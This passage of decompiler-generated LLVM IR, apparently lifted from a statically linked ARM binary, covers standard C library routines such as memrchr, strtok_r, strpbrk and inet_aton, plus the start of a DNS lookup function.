  %v2_18e9411 = icmp eq i32 %v0_18e0c.lcssa, 0
  br i1 %v2_18e9411, label %dec_label_pc_18e9c, label %dec_label_pc_18e84

dec_label_pc_18e84:                               ; preds = %dec_label_pc_18e94, %dec_label_pc_18e94.preheader
  %v0_18e94.in = phi i32 [ %v0_18e94, %dec_label_pc_18e94 ], [ %v0_18e0c.lcssa, %dec_label_pc_18e94.preheader ]
  %v15_18e8c = phi i32 [ %v1_18e90, %dec_label_pc_18e94 ], [ %v0_18df0.lcssa, %dec_label_pc_18e94.preheader ]
  %v0_18e94 = add i32 %v0_18e94.in, -1
  %v1_18e84 = inttoptr i32 %v15_18e8c to i8*
  %v2_18e84 = load i8, i8* %v1_18e84, align 1
  %v3_18e84 = zext i8 %v2_18e84 to i32
  %v9_18e88 = icmp eq i32 %v3_18e84, %v1_18db4
  br i1 %v9_18e88, label %bb52, label %dec_label_pc_18e94

bb52:                                             ; preds = %dec_label_pc_18e84
  store i32 %v3_18db0, i32* @r4, align 4
  store i32 %v6_18db0, i32* @r5, align 4
  store i32 %v9_18db0, i32* @r6, align 4
  ret i32 %v15_18e8c

dec_label_pc_18e94:                               ; preds = %dec_label_pc_18e84
  %v1_18e90 = add i32 %v15_18e8c, 1
  %v2_18e94 = icmp eq i32 %v0_18e94, 0
  br i1 %v2_18e94, label %dec_label_pc_18e9c, label %dec_label_pc_18e84

dec_label_pc_18e9c:                               ; preds = %dec_label_pc_18e94, %dec_label_pc_18e94.preheader
  store i32 %v3_18db0, i32* @r4, align 4
  store i32 %v6_18db0, i32* @r5, align 4
  store i32 %v9_18db0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_18e8c, { 1, 0, 2 }
  uselistorder i32 %v1_18e0c, { 1, 0, 2 }
  uselistorder i32 %v0_18df081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_18de0, { 1, 0 }
  uselistorder i32 %v0_18e6c37, { 1, 2, 0 }
  uselistorder i32 %v1_18db4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_18db0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18e6c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18df0, { 1, 0 }
  uselistorder label %dec_label_pc_18de0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18dd8, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_18eb8 = call i32 @memcpy()
  %v0_18ebc = load i32, i32* @r5, align 4
  %v1_18ebc = load i32, i32* @r4, align 4
  %v2_18ebc = add i32 %v1_18ebc, %v0_18ebc
  ret i32 %v2_18ebc
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_18ec4 = load i32, i32* @r4, align 4
  %v1_18ec8 = urem i32 %arg2, 256
  %v2_18ecc = add i32 %arg3, %arg1
  %v2_18ee42 = icmp eq i32 %arg3, 0
  br i1 %v2_18ee42, label %dec_label_pc_18ef4, label %dec_label_pc_18eec

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18eec
  %v1_18ed4 = add i32 %v0_18ed4, -1
  %v2_18ed4 = inttoptr i32 %v1_18ed4 to i8*
  %v3_18ed4 = load i8, i8* %v2_18ed4, align 1
  %v4_18ed4 = zext i8 %v3_18ed4 to i32
  %v9_18ed8 = icmp eq i32 %v4_18ed4, %v1_18ec8
  br i1 %v9_18ed8, label %bb, label %dec_label_pc_18ee4

bb:                                               ; preds = %dec_label_pc_18ed4
  ret i32 %v1_18ed4

dec_label_pc_18ee4:                               ; preds = %dec_label_pc_18ed4
  %v1_18ee0 = add i32 %v0_18ee0, -1
  %v2_18ee4 = icmp eq i32 %v1_18ee0, 0
  br i1 %v2_18ee4, label %dec_label_pc_18ef4, label %dec_label_pc_18eec

dec_label_pc_18eec:                               ; preds = %entry, %dec_label_pc_18ee4
  %v0_18ee0 = phi i32 [ %v1_18ee0, %dec_label_pc_18ee4 ], [ %arg3, %entry ]
  %v0_18ed4 = phi i32 [ %v1_18ed4, %dec_label_pc_18ee4 ], [ %v2_18ecc, %entry ]
  %v1_18eec = urem i32 %v0_18ed4, 4
  %v2_18eec = icmp eq i32 %v1_18eec, 0
  br i1 %v2_18eec, label %dec_label_pc_18ef4, label %dec_label_pc_18ed4

dec_label_pc_18ef4:                               ; preds = %dec_label_pc_18ee4, %dec_label_pc_18eec, %entry
  %v0_18f8c11 = phi i32 [ %v2_18ecc, %entry ], [ %v1_18ed4, %dec_label_pc_18ee4 ], [ %v0_18ed4, %dec_label_pc_18eec ]
  %v0_18f787 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_18ee4 ], [ %v0_18ee0, %dec_label_pc_18eec ]
  %v4_18ef4 = mul nuw nsw i32 %v1_18ec8, 256
  %v5_18ef4 = or i32 %v4_18ef4, %v1_18ec8
  %v4_18ef8 = mul i32 %v5_18ef4, 65536
  %v5_18ef8 = or i32 %v4_18ef8, %v5_18ef4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_18f787, 3
  br i1 %tmp, label %dec_label_pc_18f00, label %dec_label_pc_18f88

dec_label_pc_18f00:                               ; preds = %dec_label_pc_18ef4, %.backedge.backedge
  %v0_18f1c51 = phi i32 [ %v1_18f1c, %.backedge.backedge ], [ %v0_18f787, %dec_label_pc_18ef4 ]
  %v0_18f0050 = phi i32 [ %v1_18f00, %.backedge.backedge ], [ %v0_18f8c11, %dec_label_pc_18ef4 ]
  %v1_18f00 = add i32 %v0_18f0050, -4
  %v2_18f00 = inttoptr i32 %v1_18f00 to i32*
  %v3_18f00 = load i32, i32* %v2_18f00, align 4
  %v2_18f04 = xor i32 %v3_18f00, %v5_18ef8
  %v2_18f08 = add i32 %v2_18f04, 2130640639
  %v1_18f0c = sub i32 -1, %v2_18f04
  %v2_18f10 = xor i32 %v2_18f08, %v1_18f0c
  %v2_18f14 = and i32 %v2_18f10, -2130640640
  %v2_18f18 = icmp eq i32 %v2_18f14, 0
  %v1_18f1c = add i32 %v0_18f1c51, -4
  br i1 %v2_18f18, label %.backedge.backedge, label %dec_label_pc_18f24

dec_label_pc_18f24:                               ; preds = %dec_label_pc_18f00
  %v1_18f24 = add i32 %v0_18f0050, -1
  %v2_18f24 = inttoptr i32 %v1_18f24 to i8*
  %v3_18f24 = load i8, i8* %v2_18f24, align 1
  %v4_18f24 = zext i8 %v3_18f24 to i32
  %v9_18f28 = icmp eq i32 %v4_18f24, %v1_18ec8
  %v1_18f2c = add i32 %v0_18f0050, -2
  %v1_18f34 = add i32 %v0_18f0050, -3
  store i32 %v1_18f34, i32* @lr, align 4
  br i1 %v9_18f28, label %dec_label_pc_18f3c, label %dec_label_pc_18f44

dec_label_pc_18f3c:                               ; preds = %dec_label_pc_18f24
  store i32 %v3_18ec4, i32* @r4, align 4
  ret i32 %v1_18f24

dec_label_pc_18f44:                               ; preds = %dec_label_pc_18f24
  %v2_18f44 = inttoptr i32 %v1_18f2c to i8*
  %v3_18f44 = load i8, i8* %v2_18f44, align 1
  %v4_18f44 = zext i8 %v3_18f44 to i32
  %v9_18f48 = icmp eq i32 %v4_18f44, %v1_18ec8
  br i1 %v9_18f48, label %dec_label_pc_18f50, label %dec_label_pc_18f58

dec_label_pc_18f50:                               ; preds = %dec_label_pc_18f44
  store i32 %v3_18ec4, i32* @r4, align 4
  ret i32 %v1_18f2c

dec_label_pc_18f58:                               ; preds = %dec_label_pc_18f44
  %v2_18f58 = inttoptr i32 %v1_18f34 to i8*
  %v3_18f58 = load i8, i8* %v2_18f58, align 1
  %v4_18f58 = zext i8 %v3_18f58 to i32
  %v9_18f5c = icmp eq i32 %v4_18f58, %v1_18ec8
  br i1 %v9_18f5c, label %dec_label_pc_18f64, label %dec_label_pc_18f6c

dec_label_pc_18f64:                               ; preds = %dec_label_pc_18f58
  store i32 %v3_18ec4, i32* @r4, align 4
  ret i32 %v1_18f34

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18f58
  %v1_18f6c = inttoptr i32 %v1_18f00 to i8*
  %v2_18f6c = load i8, i8* %v1_18f6c, align 1
  %v3_18f6c = zext i8 %v2_18f6c to i32
  %v9_18f70 = icmp eq i32 %v3_18f6c, %v1_18ec8
  br i1 %v9_18f70, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_18f6c, %dec_label_pc_18f00
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_18f1c, 3
  br i1 %tmp70, label %dec_label_pc_18f00, label %dec_label_pc_18f88

bb19:                                             ; preds = %dec_label_pc_18f6c
  store i32 %v3_18ec4, i32* @r4, align 4
  ret i32 %v1_18f00

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f88
  %v1_18f98 = add i32 %v0_18f98, -1
  %v1_18f8c = add i32 %v0_18f8c, -1
  %v2_18f8c = inttoptr i32 %v1_18f8c to i8*
  %v3_18f8c = load i8, i8* %v2_18f8c, align 1
  %v4_18f8c = zext i8 %v3_18f8c to i32
  %v9_18f90 = icmp eq i32 %v4_18f8c, %v1_18ec8
  br i1 %v9_18f90, label %bb20, label %dec_label_pc_18f88

bb20:                                             ; preds = %dec_label_pc_18f8c
  store i32 %v3_18ec4, i32* @r4, align 4
  ret i32 %v1_18f8c

dec_label_pc_18f88:                               ; preds = %dec_label_pc_18ef4, %.backedge.backedge, %dec_label_pc_18f8c
  %v0_18f8c = phi i32 [ %v1_18f8c, %dec_label_pc_18f8c ], [ %v0_18f8c11, %dec_label_pc_18ef4 ], [ %v1_18f00, %.backedge.backedge ]
  %v0_18f98 = phi i32 [ %v1_18f98, %dec_label_pc_18f8c ], [ %v0_18f787, %dec_label_pc_18ef4 ], [ %v1_18f1c, %.backedge.backedge ]
  %v2_18f98 = icmp eq i32 %v0_18f98, 0
  br i1 %v2_18f98, label %dec_label_pc_18fa0, label %dec_label_pc_18f8c

dec_label_pc_18fa0:                               ; preds = %dec_label_pc_18f88
  store i32 %v3_18ec4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_18f98, { 1, 0 }
  uselistorder i32 %v1_18f1c, { 1, 0, 2 }
  uselistorder i32 %v1_18f00, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_18f0050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18ef4, { 1, 0 }
  uselistorder i32 %v0_18f787, { 1, 2, 0 }
  uselistorder i32 %v0_18ed4, { 1, 0, 2 }
  uselistorder i32 %v1_18ed4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_18ecc, { 1, 0 }
  uselistorder i32 %v1_18ec8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_18ec4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18f88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18f00, { 1, 0 }
  uselistorder label %dec_label_pc_18ef4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18eec, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18fb0 = load i32, i32* @r4, align 4
  store i32 %v3_18fb0, i32* %stack_var_-16, align 4
  %v6_18fb0 = load i32, i32* @r5, align 4
  %v0_18fb4 = load i32, i32* @r0, align 4
  store i32 %v0_18fb4, i32* %r4.global-to-local, align 4
  %v2_18fb4 = icmp eq i32 %v0_18fb4, 0
  %v1_18fb8 = load i32, i32* @r2, align 4
  br i1 %v2_18fb4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_18fb8 = inttoptr i32 %v1_18fb8 to i32*
  %v3_18fb8 = load i32, i32* %v2_18fb8, align 4
  store i32 %v3_18fb8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_18fbc = phi i32 [ %v3_18fb8, %bb ], [ %v0_18fb4, %entry ]
  store i32 %v0_18fbc, i32* @r0, align 4
  store i32 %v1_18fb8, i32* @r5, align 4
  %v0_18fc4 = load i32, i32* @r1, align 4
  store i32 %v0_18fc4, i32* %r6.global-to-local, align 4
  %v1_18fc8 = inttoptr i32 %v0_18fbc to i8*
  %v2_18fc8 = call i32 @__GI_strspn(i8* %v1_18fc8)
  %v0_18fcc = load i32, i32* %r4.global-to-local, align 4
  %v2_18fcc = add i32 %v0_18fcc, %v2_18fc8
  %v3_18fcc = inttoptr i32 %v2_18fcc to i8*
  %v4_18fcc = load i8, i8* %v3_18fcc, align 1
  %v6_18fcc = zext i8 %v4_18fcc to i32
  store i32 %v6_18fcc, i32* %r3.global-to-local, align 4
  store i32 %v2_18fcc, i32* @r4, align 4
  %v2_18fd4 = icmp eq i8 %v4_18fcc, 0
  store i1 %v2_18fd4, i1* @cpsr_z, align 1
  %v0_18fd8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18fd8, i32* @r1, align 4
  store i32 %v2_18fcc, i32* @r0, align 4
  br i1 %v2_18fd4, label %bb7, label %dec_label_pc_18fe8

bb7:                                              ; preds = %entry._crit_edge
  %v2_18fe0 = load i32, i32* @r5, align 4
  %v3_18fe0 = inttoptr i32 %v2_18fe0 to i32*
  store i32 %v2_18fcc, i32* %v3_18fe0, align 4
  br label %dec_label_pc_1901c

dec_label_pc_18fe8:                               ; preds = %entry._crit_edge
  %v0_18fe8 = call i32 @__GI_strpbrk()
  store i32 %v0_18fe8, i32* %r2.global-to-local, align 4
  %v3_18fec = icmp eq i32 %v0_18fe8, 0
  store i1 %v3_18fec, i1* @cpsr_z, align 1
  br i1 %v3_18fec, label %dec_label_pc_18ffc, label %dec_label_pc_1900c

dec_label_pc_18ffc:                               ; preds = %dec_label_pc_18fe8
  %v0_18ff4 = load i32, i32* @r4, align 4
  %v2_18ffc = call i32 @rawmemchr(i32 %v0_18ff4, i32 0)
  %v0_19000 = load i32, i32* @r4, align 4
  store i32 %v0_19000, i32* %r3.global-to-local, align 4
  %v1_19004 = load i32, i32* @r5, align 4
  %v2_19004 = inttoptr i32 %v1_19004 to i32*
  store i32 %v2_18ffc, i32* %v2_19004, align 4
  br label %dec_label_pc_1901c

dec_label_pc_1900c:                               ; preds = %dec_label_pc_18fe8
  %v3_19010 = inttoptr i32 %v0_18fe8 to i8*
  store i8 0, i8* %v3_19010, align 1
  %v4_19010 = load i32, i32* %r2.global-to-local, align 4
  %v5_19010 = add i32 %v4_19010, 1
  store i32 %v5_19010, i32* @r2, align 4
  %v1_19014 = load i32, i32* @r5, align 4
  %v2_19014 = inttoptr i32 %v1_19014 to i32*
  store i32 %v5_19010, i32* %v2_19014, align 4
  %v0_19018 = load i32, i32* @r4, align 4
  store i32 %v0_19018, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1901c

dec_label_pc_1901c:                               ; preds = %bb7, %dec_label_pc_18ffc, %dec_label_pc_1900c
  %v0_1901c = load i32, i32* %r3.global-to-local, align 4
  %v2_19020 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19020, i32* @r4, align 4
  store i32 %v6_18fb0, i32* @r5, align 4
  ret i32 %v0_1901c

; uselistorder directives
  uselistorder i32 %v0_18fbc, { 1, 0 }
  uselistorder i32 %v0_18fb4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1901c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_19024 = load i32, i32* @r0, align 4
  %v1_190482 = inttoptr i32 %v0_19024 to i8*
  %v2_190483 = load i8, i8* %v1_190482, align 1
  %v3_190484 = zext i8 %v2_190483 to i32
  %v2_1904c5 = icmp eq i8 %v2_190483, 0
  br i1 %v2_1904c5, label %dec_label_pc_19048._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_19054.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_1902c:                               ; preds = %dec_label_pc_19034
  %v1_1903c = add i32 %v0_1903c, 1
  %v9_1902c = icmp eq i32 %v3_19034, %v3_190486
  br i1 %v9_1902c, label %dec_label_pc_1905c, label %dec_label_pc_19034

dec_label_pc_19034:                               ; preds = %dec_label_pc_1902c, %bb
  %v0_1903c = phi i32 [ %v1_1903c, %dec_label_pc_1902c ], [ %v0_19054.pre, %bb ]
  %v1_19034 = inttoptr i32 %v0_1903c to i8*
  %v2_19034 = load i8, i8* %v1_19034, align 1
  %v3_19034 = zext i8 %v2_19034 to i32
  store i32 %v3_19034, i32* @ip, align 4
  %v2_19038 = icmp eq i8 %v2_19034, 0
  br i1 %v2_19038, label %dec_label_pc_19044, label %dec_label_pc_1902c

dec_label_pc_19044:                               ; preds = %dec_label_pc_19034
  %v1_19044 = add i32 %v0_19044, 1
  %v1_19048 = inttoptr i32 %v1_19044 to i8*
  %v2_19048 = load i8, i8* %v1_19048, align 1
  %v3_19048 = zext i8 %v2_19048 to i32
  %v2_1904c = icmp eq i8 %v2_19048, 0
  br i1 %v2_1904c, label %dec_label_pc_19048._crit_edge, label %bb

dec_label_pc_19048._crit_edge:                    ; preds = %dec_label_pc_19044, %entry
  %v3_19048.lcssa = phi i32 [ %v3_190484, %entry ], [ %v3_19048, %dec_label_pc_19044 ]
  ret i32 %v3_19048.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_19044
  %v0_19044 = phi i32 [ %v0_19024, %.lr.ph ], [ %v1_19044, %dec_label_pc_19044 ]
  %v3_190486 = phi i32 [ %v3_190484, %.lr.ph ], [ %v3_19048, %dec_label_pc_19044 ]
  br label %dec_label_pc_19034

dec_label_pc_1905c:                               ; preds = %dec_label_pc_1902c
  ret i32 %v0_19044

; uselistorder directives
  uselistorder i32 %v3_19048, { 1, 0 }
  uselistorder i32 %v3_19034, { 1, 0 }
  uselistorder i32 %v0_1903c, { 1, 0 }
  uselistorder i32 %v3_190484, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_19034, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_19064 = load i32, i32* %r0.global-to-local, align 4
  %v2_19064 = icmp eq i32 %v0_19064, 0
  %v3_19068 = load i32, i32* @r4, align 4
  store i32 %v3_19068, i32* %stack_var_-20, align 4
  br i1 %v2_19064, label %dec_label_pc_19144, label %dec_label_pc_19080.lr.ph

dec_label_pc_19080:                               ; preds = %dec_label_pc_19080.lr.ph, %dec_label_pc_19104
  %v1_19104 = phi i32 [ 0, %dec_label_pc_19080.lr.ph ], [ %v5_19104, %dec_label_pc_19104 ]
  %v0_19108 = phi i32 [ 1, %dec_label_pc_19080.lr.ph ], [ %v1_19108, %dec_label_pc_19104 ]
  %v0_19088 = phi i32 [ %v0_19064, %dec_label_pc_19080.lr.ph ], [ %v0_1908825, %dec_label_pc_19104 ]
  store i32 %v2_19084.pre, i32* @lr, align 4
  %v1_19088 = inttoptr i32 %v0_19088 to i8*
  %v2_19088 = load i8, i8* %v1_19088, align 1
  %v3_19088 = zext i8 %v2_19088 to i32
  %v3_1908c = mul nuw nsw i32 %v3_19088, 2
  %v4_1908c = add i32 %v3_1908c, %v2_19084.pre
  %v5_1908c = inttoptr i32 %v4_1908c to i8*
  %v6_1908c = load i8, i8* %v5_1908c, align 1
  %v1_19090 = and i8 %v6_1908c, 8
  %v2_19090 = icmp eq i8 %v1_19090, 0
  br i1 %v2_19090, label %dec_label_pc_19144, label %dec_label_pc_19098

dec_label_pc_19098:                               ; preds = %dec_label_pc_19080
  br label %dec_label_pc_190b8

dec_label_pc_190a0:                               ; preds = %dec_label_pc_190b8
  %v3_190a4 = mul i32 %v0_19104, 10
  %v4_190a4 = add i32 %v3_190b8, %v3_190a4
  %v1_190a8 = add i32 %v4_190a4, -48
  %v8_190b0 = icmp sgt i32 %v1_190a8, 255
  br i1 %v8_190b0, label %dec_label_pc_19144, label %dec_label_pc_190b4

dec_label_pc_190b4:                               ; preds = %dec_label_pc_190a0
  %v1_190b4 = add i32 %v0_190f4, 1
  store i32 %v1_190b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_190b8

dec_label_pc_190b8:                               ; preds = %dec_label_pc_19098, %dec_label_pc_190b4
  %v0_19104 = phi i32 [ 0, %dec_label_pc_19098 ], [ %v1_190a8, %dec_label_pc_190b4 ]
  %v0_190f4 = phi i32 [ %v0_19088, %dec_label_pc_19098 ], [ %v1_190b4, %dec_label_pc_190b4 ]
  %v1_190b8 = inttoptr i32 %v0_190f4 to i8*
  %v2_190b8 = load i8, i8* %v1_190b8, align 1
  %v3_190b8 = zext i8 %v2_190b8 to i32
  %v2_190bc = mul nuw nsw i32 %v3_190b8, 2
  %v2_190c0 = add i32 %v2_190bc, %v2_19084.pre
  %v3_190c4 = inttoptr i32 %v2_190c0 to i8*
  %v4_190c4 = load i8, i8* %v3_190c4, align 1
  %v6_190c4 = zext i8 %v4_190c4 to i32
  %v1_190d0 = and i32 %v6_190c4, 8
  %v2_190d0 = icmp eq i32 %v1_190d0, 0
  br i1 %v2_190d0, label %dec_label_pc_190d8, label %dec_label_pc_190a0

dec_label_pc_190d8:                               ; preds = %dec_label_pc_190b8
  %v8_190dc = icmp sgt i32 %v0_19108, 3
  br i1 %v8_190dc, label %dec_label_pc_190f0, label %dec_label_pc_190e0

dec_label_pc_190e0:                               ; preds = %dec_label_pc_190d8
  %v7_190e0 = icmp eq i8 %v2_190b8, 46
  br i1 %v7_190e0, label %dec_label_pc_190e8, label %dec_label_pc_19144

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190e0
  %v1_190e8 = add i32 %v0_190f4, 1
  store i32 %v1_190e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19104

dec_label_pc_190f0:                               ; preds = %dec_label_pc_190d8
  %v2_190f0 = icmp eq i8 %v2_190b8, 0
  %v1_190f4 = add i32 %v0_190f4, 1
  store i32 %v1_190f4, i32* %r0.global-to-local, align 4
  br i1 %v2_190f0, label %dec_label_pc_19104, label %dec_label_pc_190fc

dec_label_pc_190fc:                               ; preds = %dec_label_pc_190f0
  %v1_190fc = and i32 %v6_190c4, 32
  %v2_190fc = icmp eq i32 %v1_190fc, 0
  br i1 %v2_190fc, label %dec_label_pc_19144, label %dec_label_pc_19104

dec_label_pc_19104:                               ; preds = %dec_label_pc_190fc, %dec_label_pc_190f0, %dec_label_pc_190e8
  %v0_1908825 = phi i32 [ %v1_190f4, %dec_label_pc_190fc ], [ %v1_190f4, %dec_label_pc_190f0 ], [ %v1_190e8, %dec_label_pc_190e8 ]
  %v4_19104 = mul i32 %v1_19104, 256
  %v5_19104 = or i32 %v0_19104, %v4_19104
  %v1_19108 = add nuw nsw i32 %v0_19108, 1
  %v7_19110 = icmp slt i32 %v1_19108, 5
  br i1 %v7_19110, label %dec_label_pc_19080, label %dec_label_pc_19114

dec_label_pc_19080.lr.ph:                         ; preds = %entry
  %v2_19084.pre = load i32, i32* @global_var_288c8, align 4
  br label %dec_label_pc_19080

dec_label_pc_19114:                               ; preds = %dec_label_pc_19104
  %v2_19114 = icmp eq i32 %arg2, 0
  br i1 %v2_19114, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_19114
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_19114
  %v3_19130 = call i32 @llvm.bswap.i32(i32 %v5_19104)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1913c = inttoptr i32 %arg2 to i32*
  store i32 %v3_19130, i32* %v3_1913c, align 4
  %v2_19140.pre = load i32, i32* %stack_var_-20, align 4
  %v17_19140.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_19140 = phi i32 [ 1, %bb ], [ %v17_19140.pre, %bb41 ]
  %v2_19140 = phi i32 [ %v3_19068, %bb ], [ %v2_19140.pre, %bb41 ]
  store i32 %v2_19140, i32* @r4, align 4
  ret i32 %v17_19140

dec_label_pc_19144:                               ; preds = %dec_label_pc_190e0, %dec_label_pc_190fc, %dec_label_pc_19080, %dec_label_pc_190a0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_19068, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_19084.pre, { 2, 1, 0 }
  uselistorder i32 %v1_19108, { 1, 0 }
  uselistorder i32 %v0_190f4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_19068, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 7, 8, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_19144, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_190b8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_19150 = load i32, i32* @r4, align 4
  %v6_19150 = load i32, i32* @r5, align 4
  %v9_19150 = load i32, i32* @r6, align 4
  %v12_19150 = load i32, i32* @r7, align 4
  %v15_19150 = load i32, i32* @r8, align 4
  %v18_19150 = load i32, i32* @sb, align 4
  %v21_19150 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_19170 = call i32 @malloc(i32 512)
  store i32 %v1_19170, i32* @r7, align 4
  %v1_1917c = call i32 @malloc(i32 1025)
  %v2_19180 = icmp eq i32 %v1_1917c, 0
  br i1 %v2_19180, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_19184 = load i32, i32* @r7, align 4
  %v3_19184 = icmp eq i32 %v1_19184, 0
  store i32 %v1_1917c, i32* %stack_var_-236, align 4
  br i1 %v3_19184, label %bb195, label %dec_label_pc_19198

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19878

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19878

dec_label_pc_19198:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_1919c = icmp eq i32 %arg3, 0
  br i1 %v2_1919c, label %dec_label_pc_19878, label %dec_label_pc_191a4

dec_label_pc_191a4:                               ; preds = %dec_label_pc_19198
  %v2_191a8 = load i8, i8* %arg1, align 1
  %v2_191ac = icmp eq i8 %v2_191a8, 0
  br i1 %v2_191ac, label %dec_label_pc_19878, label %dec_label_pc_191b4

dec_label_pc_191b4:                               ; preds = %dec_label_pc_191a4
  %v3_191b8 = call i32 @strlen(i8* nonnull %arg1)
  %v2_191c0 = add i32 %v3_191b8, %tmp
  %v1_191c4 = add i32 %v2_191c0, -1
  %v2_191c4 = inttoptr i32 %v1_191c4 to i8*
  %v3_191c4 = load i8, i8* %v2_191c4, align 1
  %v2_191c8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_191c8, i32* @r4, align 4
  %v7_191cc = icmp eq i8 %v3_191c4, 46
  %. = zext i1 %v7_191cc to i32
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_191f0 = call i32 @__pthread_return_void()
  %v1_19200 = call i32 @__pthread_return_0()
  %v2_1920c = load i32, i32* @global_var_2eeb4.1128, align 4
  %v2_19210 = srem i32 %v2_1920c, %arg3
  %v3_19218 = load i8, i8* @global_var_28c09.1131, align 1
  %v4_19218 = zext i8 %v3_19218 to i32
  %v2_1921c = load i8, i8* bitcast (i8** @global_var_28c08.1130 to i8*), align 4
  %v3_1921c = zext i8 %v2_1921c to i32
  %v4_19224 = mul nuw nsw i32 %v4_19218, 256
  %v5_19224 = or i32 %v3_1921c, %v4_19224
  store i32 %v5_19224, i32* @sb, align 4
  store i32 %v2_19210, i32* @sl, align 4
  store i32 %v2_191c8, i32* @r0, align 4
  %v1_19238 = call i32 @__pthread_return_void()
  %v0_19244 = load i32, i32* @r5, align 4
  %v2_19264 = ptrtoint i8* %stack_var_-188 to i32
